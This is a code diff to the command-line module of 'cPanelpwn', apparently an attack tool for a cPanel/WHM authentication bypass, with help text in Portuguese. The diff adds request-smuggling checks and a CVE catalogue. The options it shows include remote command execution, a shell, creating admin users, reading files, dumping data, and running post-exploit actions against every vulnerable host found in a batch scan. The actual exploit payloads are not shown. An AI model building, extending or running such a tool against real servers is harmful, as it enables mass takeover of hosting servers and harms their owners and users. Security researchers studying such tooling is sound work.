@@ -1,22 +1,15 @@
 """cPanelpwn module: cli."""
 
-import os, sys, re, signal, time, argparse, threading
+import os, sys, re, signal, time, argparse
+import json
 from typing import List, Optional
+from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from . import config as cfg
-from . import core
-from . import discovery
-from . import parsers
-from . import cve_feed
-from . import scanner
-from . import report
-from . import actions
-from . import store
-import json
-from datetime import datetime
+from . import cves
 from .config import C, VERSION, banner, log
-from .core import ScanCtx, parse_target
-from .discovery import discover_subdomains, load_wordlist
+from .core import ScanCtx, parse_target, _has_explicit_port
+from .discovery import discover_subdomains, load_wordlist, probe_whm
 from .parsers import is_excluded, load_exclude, load_list_file
 from .cve_feed import print_cve_feed
 from .scanner import check_target, scan
@@ -57,6 +50,15 @@ def validate_args(args, p):
     if getattr(args, "post_all", False) and not a:
         errs.append("--post-all exige --action")
 
+    cve_id = getattr(args, "cve", None)
+    if cve_id and not getattr(args, "smuggle_check", False):
+        if not cves.get(cve_id):
+            errs.append(f"--cve {cve_id} não consta no catálogo (ver --list-cves)")
+        elif cve_id.upper().strip() not in cves.EXPLOITABLE:
+            errs.append(
+                f"--cve {cve_id} ainda não tem módulo de exploit "
+                f"(disponíveis: {', '.join(sorted(cves.EXPLOITABLE))})")
+
     for e in errs:
         p.error(e)
 
@@ -74,7 +76,6 @@ def extract_url(line: str) -> Optional[str]:
     return None
 
 def main():
-    global _CHECKPOINT
     p = argparse.ArgumentParser(
         description="cPanelpwn — CVE-2026-41940 cPanel/WHM Auth Bypass",
         formatter_class=argparse.RawTextHelpFormatter,
@@ -124,7 +125,7 @@ Exemplos:
     tg.add_argument("--wordlist",
                     help="Wordlist DNS customizada para brute de --domain (um prefixo por linha)")
     tg.add_argument("--hostname",
-                    help="Sobrescrever header Host canónico (detectado automaticamente)")
+                    help="Sobrescrever header Host canônico (detectado automaticamente)")
     tg.add_argument("--session",
                     help="Reutilizar cookie whostmgrsession existente (omite estágios 0-3)")
     tg.add_argument("--token",  dest="token_reuse",
@@ -160,18 +161,36 @@ Exemplos:
                     help="Desativar a pesquisa online de bypass WAF (privacidade/stealth)")
     sg.add_argument("--proxy",
                     help="Proxy HTTP para todas as requests (ex.: http://127.0.0.1:8080)")
+    sg.add_argument("--verify-tls",      action="store_true",
+                    help="Verificar o certificado TLS com as CAs do sistema (padrão: não)")
+    sg.add_argument("--cacert",
+                    help="Bundle CA (PEM) para verificar o certificado TLS do alvo")
     sg.add_argument("--check",              action="store_true",
                     help="Somente verificação passiva de versão — sem tentativa de exploit")
+    sg.add_argument("--smuggle-check",      dest="smuggle_check", action="store_true",
+                    help="Detectar HTTP request smuggling CL.TE/TE.CL "
+                         "(CVE-2026-58047) — requer alvo único (-u)")
+    sg.add_argument("--smuggle-confirm",    dest="smuggle_confirm", action="store_true",
+                    help="Confirmar o smuggling observando resposta enfileirada. "
+                         "ATENÇÃO: reusa a conexão do back-end e pode afetar "
+                         "outros usuários. Opt-in, alvo único")
+    sg.add_argument("--cve",                default=None,
+                    help="CVE a explorar (padrão: CVE-2026-41940). Ver --list-cves")
+    sg.add_argument("--list-cves",          dest="list_cves", action="store_true",
+                    help="Listar o catálogo de CVEs de cPanel/WHM conhecidas e sair")
 
     ag = p.add_argument_group("Post-Exploit")
     ag.add_argument("--action",
                     choices=["list", "passwd", "cmd", "exec", "info",
                              "version", "shell", "adduser", "addadmin",
-                             "readfile", "dump"],
+                             "readfile", "dump", "cves"],
                     help="Ação post-exploit a executar após um bypass exitoso")
     ag.add_argument("--post-all",        action="store_true",
                     help="Executar --action em TODOS os alvos vulneráveis após o scan batch")
     ag.add_argument("--passwd",          help="Senha (--action passwd / addadmin)")
+    ag.add_argument("--passwd-file",     dest="passwd_file",
+                    help="Ler a senha de um arquivo (uma linha) em vez de --passwd "
+                         "(evita expor a senha na lista de processos)")
     ag.add_argument("--cmd",             help="Comando do SO a executar (--action cmd/exec)")
     ag.add_argument("--new-user",        help="Nome de usuário (--action adduser / addadmin)")
     ag.add_argument("--new-domain",      help="Domínio (--action adduser)")
@@ -202,9 +221,21 @@ Exemplos:
 
     args = p.parse_args()
 
+    # Resolver --passwd-file antes da validação (evita a senha em ps/argv)
+    if getattr(args, "passwd_file", None):
+        try:
+            with open(args.passwd_file, encoding="utf-8") as fp:
+                args.passwd = fp.readline().rstrip("\n")
+        except OSError as e:
+            p.error(f"Não foi possível ler --passwd-file: {e}")
+
     if args.no_color:
         for attr in [x for x in dir(C) if not x.startswith("_")]:
             setattr(C, attr, "")
+
+    if getattr(args, "list_cves", False):
+        cves.print_catalog(log)
+        sys.exit(0)
 
     cfg._RETRIES       = args.retries
     cfg._QUIET         = args.quiet
@@ -216,9 +247,11 @@ Exemplos:
     cfg._NO_RESEARCH   = args.no_research
     cfg._NO_BANNER     = args.no_banner
     cfg._CVE_FEED_ON   = not args.no_cve_feed
-    cfg._CVE_DAYS      = max(1, args.cve_days)
+    cfg._CVE_DAYS      = max(1, min(args.cve_days, 3650))
     cfg._UPDATE_CHECK  = not args.no_update_check
     cfg._JSON_LINES    = args.json_lines
+    cfg._VERIFY_TLS    = args.verify_tls
+    cfg._CAFILE        = args.cacert
     banner()
     print_cve_feed(force=args.cve_feed)
 
@@ -312,6 +345,55 @@ Exemplos:
             checkpoint.set_targets(targets)
     cfg._CHECKPOINT = checkpoint
 
+    # Todos os alvos já constam no checkpoint — nada a escanear.
+    if not targets:
+        log("OK", "Nada a fazer — todos os alvos já foram escaneados (checkpoint).")
+        if args.output and STORE.all():
+            save_output(STORE.all(), args.output, elapsed=0.0,
+                        total=len(STORE.all()))
+        sys.exit(0)
+
+    # ── Modo smuggling (CVE-2026-58047, alvo único) ─────────────
+    if getattr(args, "smuggle_check", False) or getattr(args, "smuggle_confirm", False):
+        if len(targets) != 1:
+            p.error("--smuggle-check/--smuggle-confirm requerem um alvo único (-u)")
+        from .smuggling import detect as smuggle_detect, confirm as smuggle_confirm
+        tg = targets[0]
+        if "://" not in tg:
+            tg = "https://" + tg
+        if not _has_explicit_port(tg):
+            _, _host, _ = parse_target(tg)
+            found = probe_whm(_host, timeout=cfg._TIMEOUT_PROBE)
+            if found:
+                tg = found
+        scheme, host, port = parse_target(tg)
+
+        res = smuggle_detect(scheme, host, port, timeout=args.timeout)
+        if getattr(args, "smuggle_confirm", False):
+            log("WARN", "Confirmando desincronização — reusa a conexão do "
+                        "back-end; execute só contra alvo autorizado")
+            conf = smuggle_confirm(scheme, host, port, timeout=args.timeout)
+            res["confirmation"] = conf
+            if conf.get("confirmed"):
+                res["vulnerable"] = True
+                res["technique"] = conf.get("technique", res.get("technique", ""))
+        print(json.dumps(res, indent=2, ensure_ascii=False))
+
+        if args.output:
+            save_output([{
+                "severity":  "HIGH" if res["vulnerable"] else "INFO",
+                "title":     "CVE-2026-58047 — HTTP request smuggling (CL.TE/TE.CL)",
+                "target":    res["target"],
+                "cve":       "CVE-2026-58047",
+                "cvss":      f"{cves.cvss_of('CVE-2026-58047', 5.6):.1f}",
+                "technique": res.get("technique", ""),
+                "evidence":  json.dumps(
+                    res.get("confirmation", res.get("findings", [])),
+                    ensure_ascii=False)[:400],
+                "timestamp": datetime.now().isoformat(),
+            }], args.output)
+        sys.exit(0)
+
     # ── Modo check (passivo, sem exploit) ───────────────────────
     if args.check:
         log("INFO", f"Modo CHECK — scan passivo de versão em {len(targets)} alvo(s)")
@@ -333,14 +415,16 @@ Exemplos:
                 findings = []
                 for r in check_results:
                     patched = r.get("patched")
+                    aff = cves.cves_affecting(r.get("version", ""))
+                    max_cvss = max((c.cvss or 0.0) for c in aff) if aff else 0.0
                     findings.append({
                         "severity":  "HIGH" if patched is False else "INFO",
                         "title":     "cPanel & WHM version check",
                         "target":    r.get("target", ""),
                         "version":   r.get("version", ""),
                         "patched":   patched,
-                        "cve":       "CVE-2026-41940",
-                        "cvss":      "10.0",
+                        "cve":       ",".join(c.id for c in aff) or "CVE-2026-41940",
+                        "cvss":      f"{max_cvss:.1f}" if max_cvss else "9.8",
                         "waf":       "",
                         "token":     "", "canonical": "", "session": "",
                         "api_url":   "",
